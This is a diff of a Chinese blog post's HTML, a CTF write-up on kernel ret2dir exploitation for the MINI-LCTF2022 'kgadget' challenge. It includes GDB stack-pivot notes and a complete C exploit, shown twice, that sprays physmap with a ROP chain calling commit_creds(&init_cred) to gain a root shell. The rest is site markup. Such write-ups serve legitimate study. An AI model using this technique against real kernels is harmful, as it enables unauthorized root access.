……</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c">.macro PUSH_AND_CLEAR_REGS rdx=%rdx rax=%rax save_ret=<span class="hljs-number">0</span><br>	.<span class="hljs-keyword">if</span> \save_ret<br>	pushq	%rsi		<span class="hljs-comment">/* pt_regs-&gt;si */</span><br>	movq	<span class="hljs-number">8</span>(%rsp), %rsi	<span class="hljs-comment">/* temporarily store the return address in %rsi */</span><br>	movq	%rdi, <span class="hljs-number">8</span>(%rsp)	<span class="hljs-comment">/* pt_regs-&gt;di (overwriting original return address) */</span><br>	.<span class="hljs-keyword">else</span><br>	pushq   %rdi		<span class="hljs-comment">/* pt_regs-&gt;di */</span><br>	pushq   %rsi		<span class="hljs-comment">/* pt_regs-&gt;si */</span><br>	.endif<br>	pushq	\rdx		<span class="hljs-comment">/* pt_regs-&gt;dx */</span><br>	pushq   %rcx		<span class="hljs-comment">/* pt_regs-&gt;cx */</span><br>	pushq   \rax		<span class="hljs-comment">/* pt_regs-&gt;ax */</span><br>	pushq   %r8		<span class="hljs-comment">/* pt_regs-&gt;r8 */</span><br>	pushq   %r9		<span class="hljs-comment">/* pt_regs-&gt;r9 */</span><br>	pushq   %r10		<span class="hljs-comment">/* pt_regs-&gt;r10 */</span><br>	pushq   %r11		<span class="hljs-comment">/* pt_regs-&gt;r11 */</span><br>	pushq	%rbx		<span class="hljs-comment">/* pt_regs-&gt;rbx */</span><br>	pushq	%rbp		<span class="hljs-comment">/* pt_regs-&gt;rbp */</span><br>	pushq	%r12		<span class="hljs-comment">/* pt_regs-&gt;r12 */</span><br>	pushq	%r13		<span class="hljs-comment">/* pt_regs-&gt;r13 */</span><br>	pushq	%r14		<span class="hljs-comment">/* pt_regs-&gt;r14 */</span><br>	pushq	%r15		<span class="hljs-comment">/* pt_regs-&gt;r15 */</span><br>	UNWIND_HINT_REGS<br>        ……<br></code></pre></td></tr></table></figure>
 
 <h2 id="例题：MINI-LCTF2022-kgadget"><a href="#例题：MINI-LCTF2022-kgadget" class="headerlink" title="例题：MINI-LCTF2022 - kgadget"></a>例题：MINI-LCTF2022 - kgadget</h2><p>arttnba3师傅的博客讲的很清楚的了就不说了</p>
 <h3 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h3><p>进入call rbx，程序跳至gadget：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add    rsp, 0xa0</span><br><span class="line">pop    rbx</span><br><span class="line">pop    r12</span><br><span class="line">pop    r13</span><br><span class="line">pop    rbp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">add    rsp, 0xa0<br>pop    rbx<br>pop    r12<br>pop    r13<br>pop    rbp<br>ret<br></code></pre></td></tr></table></figure>
 
-<img src="/2023/08/10/kernel-ROP-ret2dir/gdb1.png" class title="gdb1">
+<img src="/2023/08/10/kernel-ROP-ret2dir/gdb1.png" srcset="/img/loading.gif" lazyload class title="gdb1">
 
 <p>执行完gadget后栈顶是储存r9的地址，之后就是try_hit</p>
-<img src="/2023/08/10/kernel-ROP-ret2dir/gdb2.png" class title="gdb2">
+<img src="/2023/08/10/kernel-ROP-ret2dir/gdb2.png" srcset="/img/loading.gif" lazyload class title="gdb2">
 
 <p>执行完r9的pop rsp后try_hit被pop到rsp中，栈就被搬到了direct mapping area里</p>
-<img src="/2023/08/10/kernel-ROP-ret2dir/gdb3.png" class title="gdb3">
+<img src="/2023/08/10/kernel-ROP-ret2dir/gdb3.png" srcset="/img/loading.gif" lazyload class title="gdb3">
 
 <p>之后ret就会执行写入的ROP链</p>
 
 
 <h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>这次使用commit_creds(&amp;init_cred)提权</p>
 <p>ps：要注意一下ioctl的第三个参数是个指针，不是直接数值传递所以必须将gadget先写进一块内核空间，即direct mapping area</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADD_RSP_0XA0_POP_RBX_POP_R12_POP_R13_POP_RBP_RET 0xffffffff810737fe</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RET 0xffffffff8108c6f1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff8108c6f0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INIT_CRED 0xffffffff82a6b700</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff810c92e0;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00fb0 + 27</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> pop_rsp_ret = <span class="number">0xffffffff811483d0</span>;</span><br><span class="line"><span class="type">size_t</span> *physmap_spray_arr[<span class="number">16000</span>];</span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">size_t</span> try_hit;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">construct_rop_chain</span><span class="params">(<span class="type">size_t</span> *rop)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = ADD_RSP_0XA0_POP_RBX_POP_R12_POP_R13_POP_RBP_RET;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">1</span>; i &lt;= (<span class="number">0xa0</span> + <span class="number">4</span> * <span class="number">8</span>) / <span class="number">8</span>; i++)</span><br><span class="line">        rop[i] = (<span class="type">size_t</span>)<span class="number">0</span>;</span><br><span class="line">    rop[i++] = POP_RDI_RET;</span><br><span class="line">    rop[i++] = INIT_CRED;</span><br><span class="line">    rop[i++] = COMMIT_CREDS;</span><br><span class="line">    rop[i++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE;</span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)<span class="number">0</span>;</span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)<span class="number">0</span>;</span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)get_root_shell;</span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp + <span class="number">8</span>;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    fd = open_dev(<span class="string">&quot;/dev/kgadget&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">        fail_print(<span class="string">&quot;Open Error!&quot;</span>);</span><br><span class="line">    <span class="type">int</span> page_size = sysconf(_SC_PAGESIZE);</span><br><span class="line">    </span><br><span class="line">    <span class="type">size_t</span> rop_chain[page_size / <span class="keyword">sizeof</span>(<span class="type">size_t</span>)];</span><br><span class="line">    construct_rop_chain(rop_chain);</span><br><span class="line">    </span><br><span class="line">    trying_print(<span class="string">&quot;Spraying physmap...&quot;</span>);</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">15000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        physmap_spray_arr[i] = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(!physmap_spray_arr[i])</span><br><span class="line">            fail_print(<span class="string">&quot;Mmap Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(physmap_spray_arr[i], rop_chain, page_size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    trying_print(<span class="string">&quot;trigger physmap one_gadget...&quot;</span>);</span><br><span class="line">    try_hit = <span class="number">0xffff888000000000</span> + <span class="number">0x7000000</span>;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14,   0x11111111;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13,   0x22222222;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12,   0x33333333;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp,   0x44444444;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx,   0x55555555;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10,   0x77777777;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,    pop_rsp_ret;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,    try_hit;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rax,   0x10;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx,   try_hit;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi,   0x1bf52;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi,   fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernel.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ADD_RSP_0XA0_POP_RBX_POP_R12_POP_R13_POP_RBP_RET 0xffffffff810737fe</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> RET 0xffffffff8108c6f1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff8108c6f0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED 0xffffffff82a6b700</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810c92e0;</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00fb0 + 27</span><br><br><span class="hljs-type">size_t</span> pop_rsp_ret = <span class="hljs-number">0xffffffff811483d0</span>;<br><span class="hljs-type">size_t</span> *physmap_spray_arr[<span class="hljs-number">16000</span>];<br><span class="hljs-type">int</span> fd;<br><span class="hljs-type">size_t</span> try_hit;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">construct_rop_chain</span><span class="hljs-params">(<span class="hljs-type">size_t</span> *rop)</span><br>&#123;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    rop[i++] = ADD_RSP_0XA0_POP_RBX_POP_R12_POP_R13_POP_RBP_RET;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">1</span>; i &lt;= (<span class="hljs-number">0xa0</span> + <span class="hljs-number">4</span> * <span class="hljs-number">8</span>) / <span class="hljs-number">8</span>; i++)<br>        rop[i] = (<span class="hljs-type">size_t</span>)<span class="hljs-number">0</span>;<br>    rop[i++] = POP_RDI_RET;<br>    rop[i++] = INIT_CRED;<br>    rop[i++] = COMMIT_CREDS;<br>    rop[i++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE;<br>    rop[i++] = (<span class="hljs-type">size_t</span>)<span class="hljs-number">0</span>;<br>    rop[i++] = (<span class="hljs-type">size_t</span>)<span class="hljs-number">0</span>;<br>    rop[i++] = (<span class="hljs-type">size_t</span>)get_root_shell;<br>    rop[i++] = user_cs;<br>    rop[i++] = user_rflags;<br>    rop[i++] = user_sp + <span class="hljs-number">8</span>;<br>    rop[i++] = user_ss;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    save_status();<br><br>    fd = open_dev(<span class="hljs-string">&quot;/dev/kgadget&quot;</span>);<br>    <span class="hljs-keyword">if</span>(fd &lt; <span class="hljs-number">0</span>)<br>        fail_print(<span class="hljs-string">&quot;Open Error!&quot;</span>);<br>    <span class="hljs-type">int</span> page_size = sysconf(_SC_PAGESIZE);<br>    <br>    <span class="hljs-type">size_t</span> rop_chain[page_size / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>)];<br>    construct_rop_chain(rop_chain);<br>    <br>    trying_print(<span class="hljs-string">&quot;Spraying physmap...&quot;</span>);<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">15000</span>; i++)<br>    &#123;<br>        physmap_spray_arr[i] = mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span>(!physmap_spray_arr[i])<br>            fail_print(<span class="hljs-string">&quot;Mmap Error!&quot;</span>);<br>        <span class="hljs-built_in">memcpy</span>(physmap_spray_arr[i], rop_chain, page_size);<br>    &#125;<br><br>    trying_print(<span class="hljs-string">&quot;trigger physmap one_gadget...&quot;</span>);<br>    try_hit = <span class="hljs-number">0xffff888000000000</span> + <span class="hljs-number">0x7000000</span>;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov r15,   0xbeefdead;&quot;</span><br>        <span class="hljs-string">&quot;mov r14,   0x11111111;&quot;</span><br>        <span class="hljs-string">&quot;mov r13,   0x22222222;&quot;</span><br>        <span class="hljs-string">&quot;mov r12,   0x33333333;&quot;</span><br>        <span class="hljs-string">&quot;mov rbp,   0x44444444;&quot;</span><br>        <span class="hljs-string">&quot;mov rbx,   0x55555555;&quot;</span><br>        <span class="hljs-string">&quot;mov r11,   0x66666666;&quot;</span><br>        <span class="hljs-string">&quot;mov r10,   0x77777777;&quot;</span><br>        <span class="hljs-string">&quot;mov r9,    pop_rsp_ret;&quot;</span><br>        <span class="hljs-string">&quot;mov r8,    try_hit;&quot;</span><br>        <span class="hljs-string">&quot;mov rax,   0x10;&quot;</span><br>        <span class="hljs-string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span><br>        <span class="hljs-string">&quot;mov rdx,   try_hit;&quot;</span><br>        <span class="hljs-string">&quot;mov rsi,   0x1bf52;&quot;</span><br>        <span class="hljs-string">&quot;mov rdi,   fd;&quot;</span><br>        <span class="hljs-string">&quot;syscall&quot;</span><br>    );<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/kernel/" class="category-chain-item">kernel</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/kernel/ROP/" class="category-chain-item">ROP</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/kernel/" class="print-no-link">#kernel</a>
+      
+        <a href="/tags/ROP/" class="print-no-link">#ROP</a>
+      
+        <a href="/tags/ret2dir/" class="print-no-link">#ret2dir</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Kernel ROP ret2dir</div>
+      <div>http://akaieurus.github.io/2023/08/10/kernel-ROP-ret2dir/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Eurus</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年8月10日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/08/16/kernel-heap-uaf/" title="Kernel Heap UAF">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Kernel Heap UAF</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/08/08/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E7%B3%BB%E7%BB%9F%E5%90%AF%E5%8A%A8%EF%BC%88%E4%B8%80%EF%BC%89/" title="Kernel源码分析-系统启动（一）">
+                        <span class="hidden-mobile">Kernel源码分析-系统启动（一）</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
 
 
     </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
 
     
+
     
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
     
 
-      <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/kernel/" rel="tag"># kernel</a>
-              <a href="/tags/ROP/" rel="tag"># ROP</a>
-              <a href="/tags/ret2dir/" rel="tag"># ret2dir</a>
-          </div>
-
-        
-
-
-        
-    <div class="post-nav">
-      <div class="post-nav-item">
-    <a href="/2023/08/08/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E7%B3%BB%E7%BB%9F%E5%90%AF%E5%8A%A8%EF%BC%88%E4%B8%80%EF%BC%89/" rel="prev" title="Kernel源码分析-系统启动（一）">
-      <i class="fa fa-chevron-left"></i> Kernel源码分析-系统启动（一）
-    </a></div>
-      <div class="post-nav-item">
-    <a href="/2023/08/16/kernel-heap-uaf/" rel="next" title="Kernel Heap UAF">
-      Kernel Heap UAF <i class="fa fa-chevron-right"></i>
-    </a></div>
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
     </div>
-      </footer>
+  </div>
+</div>
+
     
-  </article>
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
   
   
   
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
 
 
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
 
-          </div>
-          
 
-<script>
-  window.addEventListener('tabs:register', () => {
-    let { activeClass } = CONFIG.comments;
-    if (CONFIG.comments.storage) {
-      activeClass = localStorage.getItem('comments_active') || activeClass;
-    }
-    if (activeClass) {
-      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
-      if (activeTab) {
-        activeTab.click();
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
       }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
     }
-  });
-  if (CONFIG.comments.storage) {
-    window.addEventListener('tabs:click', event => {
-      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
-      let commentClass = event.target.classList[1];
-      localStorage.setItem('comments_active', commentClass);
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
     });
-  }
+  });
 </script>
 
-        </div>
-          
-  
-  <div class="toggle sidebar-toggle">
-    <span class="toggle-line toggle-line-first"></span>
-    <span class="toggle-line toggle-line-middle"></span>
-    <span class="toggle-line toggle-line-last"></span>
-  </div>
 
-  <aside class="sidebar">
-    <div class="sidebar-inner">
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
 
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc">
-          Table of Contents
-        </li>
-        <li class="sidebar-nav-overview">
-          Overview
-        </li>
-      </ul>
+  <script>Fluid.plugins.codeWidget();</script>
 
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#pt-regs"><span class="nav-number">1.</span> <span class="nav-text">pt_regs</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9AMINI-LCTF2022-kgadget"><span class="nav-number">2.</span> <span class="nav-text">例题：MINI-LCTF2022 - kgadget</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B"><span class="nav-number">2.1.</span> <span class="nav-text">调试过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">2.2.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></div>
-      </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="Eurus"
-      src="/images/avatar.jpg">
-  <p class="site-author-name" itemprop="name">Eurus</p>
-  <div class="site-description" itemprop="description">本人2022年11月—12月进入了一种原因未知的摆烂状态，故搭建博客来警醒自己。</div>
-</div>
-<div class="site-state-wrap motion-element">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-          <a href="/archives/">
-        
-          <span class="site-state-item-count">46</span>
-          <span class="site-state-item-name">posts</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-categories">
-            <a href="/categories/">
-          
-        <span class="site-state-item-count">16</span>
-        <span class="site-state-item-name">categories</span></a>
-      </div>
-      <div class="site-state-item site-state-tags">
-            <a href="/tags/">
-          
